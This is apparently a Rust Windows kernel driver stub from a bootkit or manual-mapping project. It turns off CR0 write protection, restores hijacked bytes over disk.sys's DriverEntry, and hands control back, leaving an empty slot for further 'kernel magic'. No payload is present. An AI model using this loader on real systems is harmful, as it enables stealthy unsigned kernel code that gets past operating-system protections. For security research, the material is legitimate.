#![no_std]

use kernel_log::KernelLogger;
use log::LevelFilter;
use winapi::{km::wdm::{DRIVER_OBJECT}, shared::{ntdef::{UNICODE_STRING, NTSTATUS}}};

pub const JMP_SIZE: usize = 14;
pub const MAPPER_DATA_SIZE: usize = JMP_SIZE + 7;

#[no_mangle]
pub static mut mapper_data: [u8; MAPPER_DATA_SIZE] = [0; MAPPER_DATA_SIZE];

#[no_mangle]
pub extern "system" fn __CxxFrameHandler3(_: *mut u8, _: *mut u8, _: *mut u8, _: *mut u8) -> i32 { unimplemented!() }

#[global_allocator]
static GLOBAL: kernel_alloc::KernelAlloc = kernel_alloc::KernelAlloc;

#[export_name = "_fltused"]
static _FLTUSED: i32 = 0;

#[allow(unused_imports)]
use core::panic::PanicInfo;
use core::ptr::copy_nonoverlapping;

#[cfg(not(test))]
#[panic_handler]
fn panic(_info: &PanicInfo) -> ! { loop {} }

#[allow(non_camel_case_types)]
type DriverEntryType = fn(driver_object: &mut DRIVER_OBJECT, registry_path: &UNICODE_STRING) -> NTSTATUS;

#[allow(non_upper_case_globals)]
static mut DriverEntry: Option<DriverEntryType> = None;

#[no_mangle]
pub extern "system" fn driver_entry(driver_object: &mut DRIVER_OBJECT, registry_path: &UNICODE_STRING, target_module_entry: *mut u8) -> NTSTATUS {
    // When manually mapping a driver you don't call driver_unload. You restart the system instead.
    magic(target_module_entry);

    log::info!("Calling Unhooked DriverEntry....");
    // Call the original driver entry to restore execution flow (disk.sys)
    return unsafe { DriverEntry.unwrap()(driver_object, registry_path) };
}

pub fn magic(target_module_entry: *mut u8) {
    KernelLogger::init(LevelFilter::Info).expect("Failed to initialize logger");
    log::info!("[+] Driver Entry called");

    /* Remove write protection */
    // Credits Austin Hudson: https://github.com/realoriginal/bootlicker/blob/master/bootkit/DrvMain.c#L116
    log::info!("[+] Write protection removed");
    unsafe { disable_write_protect() };

    // Unhook DriverEntry and restore stolen bytes before we do anything else
    log::info!("[+] Disk.sys DriverEntry Address: {:p}", target_module_entry);
    log::info!("[+] Stolen Bytes Address: {:p}", unsafe { mapper_data.as_ptr() });
    unsafe { copy_nonoverlapping(mapper_data.as_ptr(), target_module_entry, mapper_data.len()) };
    unsafe { DriverEntry = Some(core::mem::transmute::<*mut u8, DriverEntryType>(target_module_entry)) };
    log::info!("[+] Hooked DriverEntry restored");

    /* Insert write protection */
    // Credits Austin Hudson: https://github.com/realoriginal/bootlicker/blob/master/bootkit/DrvMain.c#L128
    log::info!("[+] Write protection restored");
    unsafe { enable_write_protect() };

    /* Do the other kernel magic below */


    /* Do the other kernel magic above */
}

/// Enable write protection bit in CR0
unsafe fn enable_write_protect() {
    let cr0 = x86::controlregs::cr0();
    x86::controlregs::cr0_write(cr0 | x86::controlregs::Cr0::CR0_WRITE_PROTECT);
}

/// Disable write protection bit in CR0
unsafe fn disable_write_protect() {
    let cr0 = x86::controlregs::cr0();
    x86::controlregs::cr0_write(cr0 & !x86::controlregs::Cr0::CR0_WRITE_PROTECT);
}